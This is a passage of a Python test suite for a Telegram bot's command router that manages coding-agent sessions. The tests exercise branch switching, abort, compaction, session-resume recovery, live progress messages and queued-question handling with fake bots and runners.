            message=f"Created branch 'enhancements' from {source_kind}/{source_branch}.",
            current_branch="enhancements",
            default_branch="main",
        ),
    )

    token = router._register_branch_source_token(source_kind, source_branch, "enhancements")
    edited = []
    query = SimpleNamespace(
        data=f"branchsource:{token}",
        answer=None,
        edit_message_text=None,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_source_callback(update, context))

    assert f"Created branch 'enhancements' from {source_kind}/{source_branch}." in edited[-1][0]
    assert router.git.prepare_from_source_calls[-1][1:] == (source_kind, source_branch, "enhancements")
    assert runner.resume_calls
    state = store.get_chat_state("bot-a", 123)
    assert state["current_branch"] == "enhancements"
    assert state["sessions"]["sess_md"]["branch_name"] == "enhancements"


def test_branch_source_failure_during_discrepancy_offers_fallback_prompt(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex", branch_name="enhancements")
    store.set_pending_action(
        "bot-a",
        123,
        {
            "kind": "message",
            "user_message": "continue",
            "branch_resolution": {
                "kind": "switch_source",
                "source_branch": "enhancements",
                "new_branch": "enhancements",
            },
        },
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="main",
        default_branch="main",
        local_branches=["main"],
        prepare_from_source_result=SimpleNamespace(
            success=False,
            message="fatal: couldn't find remote ref enhancements",
            current_branch=None,
            default_branch="main",
        ),
    )

    token = router._register_branch_source_token("origin", "enhancements", "enhancements")
    edited = []
    query = SimpleNamespace(
        data=f"branchsource:{token}",
        answer=None,
        edit_message_text=None,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_source_callback(update, context))

    assert "fatal: couldn't find remote ref enhancements" in edited[-1][0]
    assert "Do you want to create branch enhancements from one of these branches instead of origin/enhancements?" in edited[-1][0]
    labels = [button.text for row in edited[-1][1].inline_keyboard for button in row]
    assert "local/main" in labels
    assert "origin/main" in labels


def test_current_reports_missing_active_session(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/current")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_current(update, context))

    assert bot.messages[-1][1] == "No active session.\nPlease run /project and /new first."


def test_current_reports_active_session_details(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_current", "current-session", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/current")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_current(update, context))

    assert "Current session: current-session" in bot.messages[-1][1]
    assert "Session ID: sess_current" in bot.messages[-1][1]
    assert "Project: backend" in bot.messages[-1][1]
    assert "Provider: codex" in bot.messages[-1][1]
    assert "Branch: feature-1" in bot.messages[-1][1]


def test_abort_reports_when_no_project_selected(tmp_path: Path):
    runner = DummyRunner()
    runner.abort_running_process = lambda _project_path: False
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/abort")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_abort(update, context))

    assert bot.messages[-1][1] == "No project selected.\nPlease run /project &lt;project_folder&gt; first."


def test_abort_reports_when_no_running_process_exists(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    runner.abort_running_process = lambda _project_path: False
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/abort")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_abort(update, context))

    assert bot.messages[-1][1] == "No running agent process was found for the current project."


def test_abort_sends_signal_for_current_project_run(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    aborted_paths = []
    runner.abort_running_process = lambda project_path: aborted_paths.append(project_path) or True
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/abort")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_abort(update, context))

    assert aborted_paths == [backend]
    assert bot.messages[-1][1] == "Abort signal sent for the current project run."


def test_compact_reports_usage_when_args_are_passed(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/compact extra")
    bot = FakeBot()
    context = SimpleNamespace(args=["extra"], bot=bot)

    asyncio.run(router.handle_compact(update, context))

    assert bot.messages[-1][1] == "Usage: /compact"


@pytest.mark.parametrize("provider", ["codex", "copilot"])
def test_compact_creates_fresh_session_from_summary(tmp_path: Path, provider: str):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = CompactingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_current", "current-session", "backend", provider)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="/compact")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_compact(update, context))

    assert runner.resume_calls[-1]["provider"] == provider
    assert runner.resume_calls[-1]["session_id"] == "sess_current"
    assert "compact handoff summary" in runner.resume_calls[-1]["user_message"].lower()
    assert runner.create_calls[-1]["provider"] == provider
    assert "Use this compact handoff summary" in runner.create_calls[-1]["user_message"]
    state = store.get_chat_state("bot-a", 123)
    assert state["active_session_id"] == "sess_compacted"
    assert state["sessions"]["sess_compacted"]["name"] == "current-session-1"
    assert "Session compacted successfully." in bot.messages[-1][1]


def test_assistant_command_block_is_sent_separately(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = CommandBlockRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_cmd", "command-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="give me the command")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert any(message[1] == "Command (2/2)" for message in bot.messages)
    assert any("git commit -m &quot;test&quot;" in message[1] for message in bot.messages)


def test_successful_resume_creates_new_session_and_switches_active_session(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = SessionIdRotatingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_original", "rotating-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="keep going")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state["active_session_id"] == "sess_rotated"
    assert "sess_rotated" in state["sessions"]
    assert "sess_original" in state["sessions"]
    assert state["sessions"]["sess_rotated"]["name"] == "rotating-session-1"
    assert "Resume succeeded, but the session ID changed." in bot.messages[1][1]
    assert "New session ID: sess_rotated" in bot.messages[1][1]
    assert "New session name: rotating-session-1" in bot.messages[1][1]


def test_invalid_resume_recovery_creates_new_session_and_switches_active_session(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = ResumeReplacementRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_original", "recover-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="keep going")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state["active_session_id"] == "sess_abc123"
    assert "sess_original" in state["sessions"]
    assert state["sessions"]["sess_abc123"]["name"] == "recover-session-1"
    assert "Resume failed, so a new session was created." in bot.messages[1][1]
    assert "New session ID: sess_abc123" in bot.messages[1][1]
    assert "New session name: recover-session-1" in bot.messages[1][1]


def test_invalid_resume_recovery_uses_next_available_suffix_for_new_session_name(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = ResumeReplacementRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_original", "recover-session", "backend", "codex")
    store.create_session("bot-a", 123, "sess_existing", "recover-session-1", "backend", "codex")
    store.switch_session("bot-a", 123, "sess_original")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="keep going")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state["active_session_id"] == "sess_abc123"
    assert state["sessions"]["sess_abc123"]["name"] == "recover-session-2"


def test_active_session_reports_stalled_agent_process(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = StallingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_stall", "stall-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="continue")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert any("The current agent run appears stuck." in message[1] for message in bot.messages)
    assert any("hidden permission dialog" in message[1] for message in bot.messages)


def test_active_session_deletes_live_progress_message_when_final_output_is_sent(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = ProgressRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_progress", "progress-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="continue")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert len(bot.deleted_messages) == 1
    assert bot.deleted_messages[0][0] == 123
    assert any("Codex output" in message[1] for message in bot.messages)


def test_active_session_reuses_single_live_progress_message(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = RapidProgressRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_progress", "progress-session", "backend", "copilot")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="continue")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    progress_messages = [message for message in bot.messages if "Live agent output" in message[1]]
    assert len(progress_messages) == 2
    assert bot.edit_count == 1


def test_active_session_deletes_live_progress_message_even_if_progress_send_is_slow(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = ProgressRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_progress", "progress-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="continue")
    bot = SlowProgressBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert len(bot.deleted_messages) == 1


def test_active_session_deletes_previous_live_progress_message_when_edit_falls_back_to_send(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = RapidProgressRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_progress", "progress-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="continue")
    bot = EditFailingProgressBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert len(bot.deleted_messages) == 2
    deleted_ids = [message_id for chat_id, message_id in bot.deleted_messages if chat_id == 123]
    assert len(set(deleted_ids)) == 2


def test_second_message_is_queued_while_first_run_is_still_running(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = BlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_update = make_update(text="first question")
        second_update = make_update(text="second question")
        first_context = SimpleNamespace(args=[], bot=bot)
        second_context = SimpleNamespace(args=[], bot=bot)

        first_task = asyncio.create_task(router.handle_message(first_update, first_context))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(second_update, second_context)

        assert any("Question queued as Q1." in message for _, message, _, _ in bot.messages)
        assert not any("Working on queued questions:" in message for _, message, _, _ in bot.messages)
        assert not any("already running on project" in message for _, message, _, _ in bot.messages)
        assert not any("Command failed" in message for _, message, _, _ in bot.messages)

        runner.release_next()
        started_second = await asyncio.to_thread(runner.wait_started, 2, 1.0)
        assert started_second is True
        runner.release_next()
        await first_task

        assert len(runner.resume_calls) == 2
        assert runner.resume_calls[0]["user_message"] == "first question"
        assert runner.resume_calls[1]["user_message"] == "second question"
        assert any("Working on queued questions:" in message for _, message, _, _ in bot.messages)
        assert any("1. second question" in message for _, message, _, _ in bot.messages)

    asyncio.run(exercise())


def test_second_message_is_queued_even_before_runner_reports_busy(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = BlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_update = make_update(text="first question", message_id=101)
        second_update = make_update(text="second question", message_id=202)

        first_task = asyncio.create_task(router.handle_message(first_update, SimpleNamespace(args=[], bot=bot)))
        await asyncio.sleep(0)
        await router.handle_message(second_update, SimpleNamespace(args=[], bot=bot))

        assert any("Question queued as Q1." in message for _, message, _, _ in bot.messages)

        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True
        runner.release_next()
        started_second = await asyncio.to_thread(runner.wait_started, 2, 1.0)
        assert started_second is True
        runner.release_next()
        await first_task

        assert len(runner.resume_calls) == 2
        assert runner.resume_calls[0]["user_message"] == "first question"
        assert runner.resume_calls[1]["user_message"] == "second question"

    asyncio.run(exercise())


def test_grouped_queue_batch_requires_user_decision_then_processes_remaining_queue(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = BlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_update = make_update(text="first question", message_id=101)
        second_update = make_update(text="two", message_id=202)
        third_update = make_update(text="three", message_id=303)
        fourth_update = make_update(text="four four four four four four four", message_id=404)
        first_context = SimpleNamespace(args=[], bot=bot)

        first_task = asyncio.create_task(router.handle_message(first_update, first_context))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(second_update, SimpleNamespace(args=[], bot=bot))
        await router.handle_message(third_update, SimpleNamespace(args=[], bot=bot))
        runner.release_next()
        await first_task

        prompt_messages = [entry for entry in bot.messages if "Multiple queued questions are ready." in entry[1]]
        assert len(prompt_messages) == 1
        keyboard = prompt_messages[0][3]
        assert keyboard is not None
        buttons = keyboard.inline_keyboard[0]
        assert buttons[0].callback_data == "queuebatch:group"
        assert buttons[1].callback_data == "queuebatch:single"
        assert buttons[2].callback_data == "queuebatch:cancel"
        assert buttons[0].text == "Group the questions"
        assert buttons[1].text == "Process one by one"
        assert buttons[2].text == "Cancel"
        assert buttons[0].api_kwargs == {}
        assert buttons[1].api_kwargs == {}
        assert buttons[2].api_kwargs == {"style": "danger"}

        answers = []
        edited = []
        callback_update = SimpleNamespace(
            effective_chat=SimpleNamespace(id=123, type="private"),
            callback_query=SimpleNamespace(data="queuebatch:group", answer=None, edit_message_text=None),
        )

        async def fake_answer():
            answers.append("answered")

        async def fake_edit(text):
            edited.append(text)

        callback_update.callback_query.answer = fake_answer
        callback_update.callback_query.edit_message_text = fake_edit

        callback_task = asyncio.create_task(router.handle_queue_batch_callback(callback_update, SimpleNamespace(args=[], bot=bot)))
        started_second = await asyncio.to_thread(runner.wait_started, 2, 1.0)
        assert started_second is True
        await router.handle_message(fourth_update, SimpleNamespace(args=[], bot=bot))
        runner.release_next()
        await callback_task
        started_third = await asyncio.to_thread(runner.wait_started, 3, 1.0)
        assert started_third is True
        runner.release_next()

        assert len(runner.resume_calls) == 3
        assert runner.resume_calls[0]["user_message"] == "first question"
        assert "Answer the following queued user questions in order." in runner.resume_calls[1]["user_message"]
        assert "[Question 1]\ntwo\n[End Question 1]" in runner.resume_calls[1]["user_message"]
        assert "[Question 2]\nthree\n[End Question 2]" in runner.resume_calls[1]["user_message"]
        assert runner.resume_calls[2]["user_message"] == "four four four four four four four"
        assert answers == ["answered"]
        assert edited == ["Processing the queued questions as one batch."]
        queued_notices = [message for _, message, _, _ in bot.messages if "Working on queued questions:" in message]
        assert any("1. two" in message and "2. three" in message for message in queued_notices)
        assert any("1. four four four four four four four" in message for message in queued_notices)
        working_entries = [entry for entry in bot.sent_messages if "Working on it..." in entry["text"]]
        assert [entry["reply_to_message_id"] for entry in working_entries] == [101, None, 404]
        final_entries = [
            entry
            for entry in bot.sent_messages
            if "Codex output" in entry["text"] or "Task completed." in entry["text"]
        ]
        reply_targets = {entry["reply_to_message_id"] for entry in final_entries}
        assert 101 in reply_targets
        assert None in reply_targets
        assert 404 in reply_targets

    asyncio.run(exercise())


def test_single_queue_batch_choice_processes_remaining_questions_without_reprompt(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = BlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_task = asyncio.create_task(router.handle_message(make_update(text="first question"), SimpleNamespace(args=[], bot=bot)))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(make_update(text="two"), SimpleNamespace(args=[], bot=bot))
        await router.handle_message(make_update(text="three"), SimpleNamespace(args=[], bot=bot))
        await router.handle_message(make_update(text="four"), SimpleNamespace(args=[], bot=bot))
        runner.release_next()
        await first_task

        prompt_messages = [entry for entry in bot.messages if "Multiple queued questions are ready." in entry[1]]
        assert len(prompt_messages) == 1

        answers = []
        edited = []
        callback_update = SimpleNamespace(
            effective_chat=SimpleNamespace(id=123, type="private"),
            callback_query=SimpleNamespace(data="queuebatch:single", answer=None, edit_message_text=None),
        )

        async def fake_answer():
            answers.append("answered")

        async def fake_edit(text):
            edited.append(text)

        callback_update.callback_query.answer = fake_answer
        callback_update.callback_query.edit_message_text = fake_edit

        callback_task = asyncio.create_task(
            router.handle_queue_batch_callback(callback_update, SimpleNamespace(args=[], bot=bot))
        )

        started_second = await asyncio.to_thread(runner.wait_started, 2, 1.0)
        assert started_second is True
        runner.release_next()

        started_third = await asyncio.to_thread(runner.wait_started, 3, 1.0)
        assert started_third is True
        runner.release_next()

        started_fourth = await asyncio.to_thread(runner.wait_started, 4, 1.0)
        assert started_fourth is True
        runner.release_next()
        await callback_task

        assert len(runner.resume_calls) == 4
        assert runner.resume_calls[0]["user_message"] == "first question"
        assert runner.resume_calls[1]["user_message"] == "two"
        assert runner.resume_calls[2]["user_message"] == "three"
        assert runner.resume_calls[3]["user_message"] == "four"
        assert answers == ["answered"]
        assert edited == ["Processing the queued questions one by one."]
        assert len([entry for entry in bot.messages if "Multiple queued questions are ready." in entry[1]]) == 1

    asyncio.run(exercise())


def test_cancel_queue_batch_discards_pending_batch(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = BlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_task = asyncio.create_task(router.handle_message(make_update(text="first question"), SimpleNamespace(args=[], bot=bot)))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(make_update(text="two"), SimpleNamespace(args=[], bot=bot))
        await router.handle_message(make_update(text="three"), SimpleNamespace(args=[], bot=bot))
        runner.release_next()
        await first_task

        prompt_messages = [entry for entry in bot.messages if "Multiple queued questions are ready." in entry[1]]
        assert len(prompt_messages) == 1

        answers = []
        edited = []
        callback_update = SimpleNamespace(
            effective_chat=SimpleNamespace(id=123, type="private"),
            callback_query=SimpleNamespace(data="queuebatch:cancel", answer=None, edit_message_text=None),
        )

        async def fake_answer():
            answers.append("answered")

        async def fake_edit(text):
            edited.append(text)

        callback_update.callback_query.answer = fake_answer
        callback_update.callback_query.edit_message_text = fake_edit

        await router.handle_queue_batch_callback(callback_update, SimpleNamespace(args=[], bot=bot))

        assert len(runner.resume_calls) == 1
        assert answers == ["answered"]
        assert edited == ["Queued questions were cancelled."]
        assert router._chat_pending_queue_decisions == {}

    asyncio.run(exercise())


def test_aborted_run_with_pending_queue_prompts_before_continuing(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = AbortableBlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_task = asyncio.create_task(router.handle_message(make_update(text="first question"), SimpleNamespace(args=[], bot=bot)))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(make_update(text="second question"), SimpleNamespace(args=[], bot=bot))
        await router.handle_abort(make_update(text="/abort"), SimpleNamespace(args=[], bot=bot))
        await first_task

        assert len(runner.resume_calls) == 1
        assert any("aborted" in message.lower() for _, message, _, _ in bot.messages)
        prompt_messages = [entry for entry in bot.messages if "Do you want to continue processing the pending queued questions?" in entry[1]]
        assert len(prompt_messages) == 1
        keyboard = prompt_messages[0][3]
        assert keyboard is not None
        buttons = keyboard.inline_keyboard[0]
        assert buttons[0].callback_data == "queuecontinue:yes"
        assert buttons[1].callback_data == "queuecontinue:no"
        assert buttons[0].text == "Yes"
        assert buttons[1].text == "No"
        assert buttons[0].api_kwargs == {"style": "primary"}
        assert buttons[1].api_kwargs == {"style": "danger"}

    asyncio.run(exercise())


def test_aborted_run_without_pending_queue_does_not_prompt(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = AbortableBlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_task = asyncio.create_task(router.handle_message(make_update(text="first question"), SimpleNamespace(args=[], bot=bot)))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_abort(make_update(text="/abort"), SimpleNamespace(args=[], bot=bot))
        await first_task

        assert len(runner.resume_calls) == 1
        assert any("aborted" in message.lower() for _, message, _, _ in bot.messages)
        assert not any(
            "Do you want to continue processing the pending queued questions?" in message
            for _, message, _, _ in bot.messages
        )

    asyncio.run(exercise())


def test_aborted_run_yes_callback_continues_pending_queue(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = AbortableBlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_task = asyncio.create_task(router.handle_message(make_update(text="first question"), SimpleNamespace(args=[], bot=bot)))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(make_update(text="second question"), SimpleNamespace(args=[], bot=bot))
        await router.handle_abort(make_update(text="/abort"), SimpleNamespace(args=[], bot=bot))
        await first_task

        edited = []
        answers = []
        update = SimpleNamespace(
            effective_chat=SimpleNamespace(id=123, type="private"),
            callback_query=SimpleNamespace(
                data="queuecontinue:yes",
                answer=None,
                edit_message_text=None,
            ),
        )

        async def fake_answer():
            answers.append("answered")

        async def fake_edit(text):
            edited.append(text)

        update.callback_query.answer = fake_answer
        update.callback_query.edit_message_text = fake_edit

        callback_task = asyncio.create_task(router.handle_queue_continue_callback(update, SimpleNamespace(args=[], bot=bot)))
        started_second = await asyncio.to_thread(runner.wait_started, 2, 1.0)
        assert started_second is True
        runner.release_next()
        await callback_task

        assert answers == ["answered"]
        assert edited == ["Continuing with the pending queued questions."]
        assert len(runner.resume_calls) == 2
        assert runner.resume_calls[1]["user_message"] == "second question"
        assert any("Working on queued questions:" in message for _, message, _, _ in bot.messages)

    asyncio.run(exercise())


def test_aborted_run_no_callback_discards_pending_queue(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = AbortableBlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_task = asyncio.create_task(router.handle_message(make_update(text="first question"), SimpleNamespace(args=[], bot=bot)))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(make_update(text="second question"), SimpleNamespace(args=[], bot=bot))
        await router.handle_abort(make_update(text="/abort"), SimpleNamespace(args=[], bot=bot))
        await first_task

        edited = []
        answers = []
        update = SimpleNamespace(
            effective_chat=SimpleNamespace(id=123, type="private"),
            callback_query=SimpleNamespace(
                data="queuecontinue:no",
                answer=None,
                edit_message_text=None,
            ),
        )

        async def fake_answer():
            answers.append("answered")

        async def fake_edit(text):
            edited.append(text)

